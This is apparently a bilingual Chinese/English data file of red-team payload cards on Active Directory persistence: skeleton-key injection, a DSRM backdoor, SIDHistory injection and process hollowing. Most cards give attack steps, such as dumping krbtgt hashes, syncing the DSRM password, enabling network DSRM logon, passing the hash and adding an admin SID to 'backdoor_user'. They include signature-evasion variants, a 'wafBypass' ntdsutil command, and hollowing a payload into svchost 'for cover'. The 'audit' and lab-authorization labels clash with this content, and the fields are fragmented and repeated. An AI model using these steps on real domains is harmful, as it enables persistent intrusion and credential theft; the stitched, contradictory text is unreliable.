description.en: List LSASS again to confirm no restart; the master password still authenticating any account means the domain-wide backdoor holds.

description.en: Inject the skeleton key from memory via PowerShell to avoid on-disk mimikatz signatures; domain auth succeeding with any password confirms success.

description.zh: 以 .NET 内联方式在代理进程内执行：无独立工具进程；注入后 mimikatz 口令可登录即成功。
description.en: Run the .NET variant in-process with no standalone tool process; the default skeleton password authenticating afterwards confirms success.

description.zh: 操作机不落工具，远程 WMI 在域控触发；进程创建返回 PID 且骨架口令可登录即成功。
description.en: Trigger remotely via WMI keeping the operator host clean; a returned PID plus working skeleton password confirms success.

name.zh: DSRM 配置与登录行为审计

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

overview.en: This payload covers DSRM configuration and logon-behavior auditing, testing the sync chain between Directory Services Restore Mode passwords and domain accounts plus network-logon exposure. Validation covers hash extraction, DSRM syncing, logon-behavior rewriting and pass-the-hash, mapped to steps 1 through 4.

vulnerability.zh: 根因在于 DSRM 密码可与域账号同步而默认仅限本机登录，攻击者改写 DsrmAdminLogonBehavior 后即可经网络以恢复密码进入域控，形成绕过域目录的后门。
vulnerability.en: The root cause is the DSRM password being syncable with a domain account while restricted to local logon by default: after rewriting DsrmAdminLogonBehavior, attackers enter the DC over the network with the restore password, a backdoor bypassing the directory.

exploitation.zh: 第 1 步用 mimikatz 提取 krbtgt 等哈希并转储本地 SAM；第 2 步以 ntdsutil 把 DSRM 密码同步到指定域账户；第 3 步写入 DsrmAdminLogonBehavior 为 2 解除登录限制；第 4 步以同步后的 NTLM 哈希对域控执行哈希传递验证可达性。以远程会话建立为判据。占位符在全局变量菜单替换；测试后还原配置并重置 DSRM 密码。
exploitation.en: In step 1, extract krbtgt-class hashes with mimikatz and dump the local SAM. In step 2, sync the DSRM password to a chosen domain account with ntdsutil. In step 3, write DsrmAdminLogonBehavior as 2 lifting logon limits. In step 4, pass the synced NTLM hash against the DC to verify reachability. Judge by an established remote session. Replace placeholders via the global variables menu; restore settings and reset the DSRM password after testing.

mitigation.zh: 定期轮换每台域控的 DSRM 密码并保证互不相同，监控 DsrmAdminLogonBehavior 与 4657 注册表事件。修复后重放第 3、4 步，改写应被阻断且网络登录被拒绝。
mitigation.en: Rotate every DC's DSRM password regularly with unique values, monitor DsrmAdminLogonBehavior and 4657 registry events. After the fix, replay steps 3 and 4: rewrites should be blocked and network logons denied.

title.zh: 提取 krbtgt 与本地哈希

description.zh: 用 lsadump::lsa 的 patch 模式提取 krbtgt 哈希，再提升令牌转储本地 SAM；两份哈希到手即为 DSRM 后门备齐凭据材料。
description.en: Pull the krbtgt hash with lsadump::lsa /patch, then elevate and dump local SAM; both hashes stock the DSRM backdoor with credentials.

description.zh: 进入 ntdsutil 执行 dsrm password 设置并从域账户同步；提示成功即域控本地管理员密码与指定域账户一致，后门凭据就绪。
description.en: In ntdsutil run the DSRM password reset synced from a domain account; success aligns the DC's local admin with a credential you control.

title.zh: 放开 DSRM 网络登录

description.zh: 向 LSA 注册表键写入 DsrmAdminLogonBehavior 等于 2；DSRM 账号从此允许远程网络登录，后门入口对远程攻击者打开。
description.en: Write DsrmAdminLogonBehavior=2 under the LSA key; the DSRM account may now log on remotely, opening the backdoor over the network.

description.zh: 用 sekurlsa::pth 以哈希发起新登录会话；即使域认证通道失效仍可经 DSRM 进入域控，形成域外的持久管理通道。
description.en: Launch a new logon session with sekurlsa::pth using the hash; even with domain auth broken, DSRM still admits you to the DC as a lasting channel.

analysis.zh: DSRM 配置与登录行为审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: DSRM Configuration and Logon-Behavior Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只读取 DSRM 登录行为、相关策略和审计事件，不修改密码、注册表或使用哈希登录。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

wafBypass.command: ntdsutil "set dsrm password" "reset password on server null" "P@ssw0rd" "P@ssw0rd" quit quit

description.zh: 用目录工具原生接口重置 DSRM 密码规避 mimikatz 特征；返回 success 即后门口令生效。
description.en: Reset the DSRM password via the native directory tool past mimikatz signatures; a returned success confirms the backdoor password.

description.zh: 改注册表允许 DSRM 账户远程登录替代本地控制台路径；值生效后网络登录成功即成功。
description.en: Enable remote DSRM logon via the registry switch instead of the local console path; successful network logon after the value applies confirms success.

title.zh: 离线 SAM 提取变体

description.zh: 对已落地注册表蜂巢离线解析 RID 500 即 DSRM 账户哈希；输出行即成功。
description.en: Parse a landed registry hive offline; the RID-500 line output yields the DSRM account hash, confirming success.

name.zh: SIDHistory 授权基线审计

description.zh: SIDHistory 授权基线审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: SIDHistory Authorization-Baseline Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 SIDHistory 授权基线审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for SIDHistory Authorization-Baseline Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 SIDHistory 授权基线审计场景，检验账户附加 SID 对权限继承的操纵面。验证维度含 SID 注入、令牌组对照与指定账户审计三步，对应第 1 至第 3 步。
overview.en: This payload covers SIDHistory authorization-baseline auditing, testing how appended SIDs manipulate privilege inheritance. Validation covers SID injection, token-group comparison and per-account auditing, mapped to steps 1 through 3.

vulnerability.zh: 根因在于认证令牌展开 SIDHistory 属性参与授权：对目录具备写权限的攻击者给任意账户追加高权限 SID，权限随之静默继承且常规组成员审查不可见。
vulnerability.en: The root cause is authentication tokens expanding SIDHistory into authorization: attackers with directory-write rights append high-privilege SIDs to any account, silently inheriting access invisible to routine group reviews.

exploitation.zh: 第 1 步用 mimikatz 的 sid::add 向测试账户追加管理员 SID；第 2 步以 Get-ADUser 查询 sidHistory 并以 whoami 对照令牌组，确认注入 SID 进入授权上下文；第 3 步对指定账户逐一读取 sIDHistory 圈定超基线附加项。以注入 SID 出现在令牌组为判据。占位符在全局变量菜单替换；测试后立即清除注入。
exploitation.en: In step 1, append the Administrators SID to a test account with mimikatz sid::add. In step 2, query sidHistory with Get-ADUser and compare token groups via whoami, confirming the injected SID enters authorization. In step 3, read sIDHistory per chosen account isolating beyond-baseline appends. Judge by the injected SID in token groups. Replace placeholders via the global variables menu; purge injections immediately after testing.

mitigation.zh: 定期导出全部账户 sIDHistory 并与迁移清单比对，回收目录写权限并监控 SIDHistory 属性变更。修复后重放第 1 步，注入应失败且变更事件触发告警。
mitigation.en: Regularly export all accounts' sIDHistory and diff against migration inventories, revoke directory-write rights, and alert on SIDHistory attribute changes. After the fix, replay step 1: injection should fail with change events firing.

title.zh: 注入管理员 SID 历史

description.zh: 用 mimikatz 的 sid::add 给 backdoor_user 追加 administrator 的 SID 历史；命令返回成功即普通账户静默继承域管权限。
description.en: Use sid::add to append the administrator SID to backdoor_user's history; on success the plain account silently inherits domain-admin rights.

description.zh: 查询该账户的 sidHistory 属性并以 whoami /all 检查令牌组；令牌中出现管理员 SID 即权限注入生效，可执行域管级操作。
description.en: Read the account's sidHistory and check whoami /all; the admin SID surfacing in the token groups proves the injected privilege is live.

title.en: Hunt existing injections in the domain

description.zh: 读取目标账户的 sIDHistory 属性并列出全部附加 SID；发现超出正常授权的条目即可复用其权限横向移动，顺藤摸瓜找隐蔽账户。
description.en: Dump target accounts' sIDHistory values; entries beyond legitimate grants expose reusable privilege and hidden pivot accounts.

analysis.zh: SIDHistory 授权基线审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。

opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 读取指定实验用户的 sIDHistory 并与批准迁移记录比较，不注入 SID 或登录。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 以目录管理模块替代 mimikatz sid::add 特征；目标用户 sIDHistory 查询回显管理员 SID 即成功。
description.en: Append via the directory admin module instead of mimikatz sid::add; the target user's sIDHistory echoing the admin SID confirms success.

description.zh: 以 .NET 目录对象直写历史 SID 绕过工具签名；CommitChanges 后属性可见即成功。
description.en: Write the historical SID through a raw .NET directory object bypassing tool signatures; the attribute visible after CommitChanges confirms success.

description.zh: 以完整 SID 字符串替代账户名解析注入域管组历史 SID；whoami /all 显示历史 SID 即成功。
description.en: Inject the full SID string instead of resolving an account name; whoami /all showing the historical SID confirms success.

name.zh: 进程镂空遥测与内存审计

description.zh: 进程镂空遥测与内存审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 进程镂空遥测与内存审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Process-Hollowing Telemetry and Memory Audit are authorized in writing and reversible.

prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖进程镂空的遥测与内存审计场景，检验 SVCHOST 类宿主进程的路径与模块完整性核查方法。验证维度含 Sysmon 事件审计、SVCHOST 实例核查与可疑关联复核三步，对应第 1 至第 3 步。
overview.en: This payload covers process-hollowing telemetry and memory auditing, testing path and module integrity checks on SVCHOST-class host processes. Validation covers Sysmon event review, SVCHOST instance verification and suspicious-correlation follow-up, mapped to steps 1 through 3.

vulnerability.zh: 根因在于镂空技术以合法镜像为宿主替换执行内容：进程名与路径看似正常而模块列表与父进程异常，遥测若未覆盖镜像加载与内存访问事件即形成盲区。
vulnerability.en: The root cause is hollowing using a legitimate image as the host while swapping execution content: process name and path look normal yet module lists and parentage go wrong, and telemetry without image-load and memory-access events leaves blind spots.

exploitation.zh: 第 1 步抽取 Sysmon 的进程创建、镜像加载与进程访问三类事件，核对 SVCHOST 实例的父进程与命令行是否符合基线；第 2 步枚举运行中 SVCHOST 的路径与模块列表，路径为空或模块异常即定位可疑宿主；第 3 步对命中实例回查创建与加载事件形成时间线并以同一请求标识关联。以异常实例定位为成功判据。占位符在全局变量菜单替换。
exploitation.en: In step 1, pull Sysmon process-creation, image-load and process-access events, checking SVCHOST instances' parent processes and command lines against baselines. In step 2, enumerate running SVCHOST paths and module lists; empty paths or odd module sets mark suspicious hosts. In step 3, trace hits back to creation and load events for a timeline, correlating under one request ID. Judge success by locating anomalous instances. Replace placeholders via the global variables menu.

mitigation.zh: 保持 Sysmon 全量启用并集中收集 1、7、10 事件，对路径空值与非常规父进程建立实时检测规则。修复后重放第 1 至第 3 步，演练镂空样本应在第 1 步即被检出。
mitigation.en: Run Sysmon at full coverage collecting events 1, 7 and 10 centrally, with real-time rules for empty paths and atypical parents. After the fix, replay steps 1 through 3: a drilled hollowing sample should be caught at step 1.

title.zh: 筛查 Sysmon 进程事件

description.zh: 抽取 Sysmon 的进程创建、镜像加载与进程访问事件，核对 SVCHOST 的父进程、命令行和模块；出现非常规父进程即锁定可疑宿主。
description.en: Pull Sysmon process-creation, image-load and access events and vet SVCHOST parents, command lines and modules; odd parentage flags a suspect host.

title.zh: 核查 SVCHOST 实例完整性

description.zh: 枚举运行中 SVCHOST 的可执行路径与已加载模块；路径为空或模块列表异常的实例即疑似被镂空替换的宿主，记录编号待用。
description.en: Enumerate running SVCHOST paths and loaded modules; an empty path or anomalous module list marks a likely hollowed host and its PID.

title.en: Trace the event chain to pin the host

description.zh: 对可疑实例回查其创建与镜像加载事件并按时间串联；确认宿主后即可把载荷镂空进合法 svchost，借系统进程掩护长期运行。
description.en: Correlate the suspect's creation and image-load events on a timeline; once pinned, hollow your payload into the legitimate svchost for cover.

analysis.zh: 进程镂空遥测与内存审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.
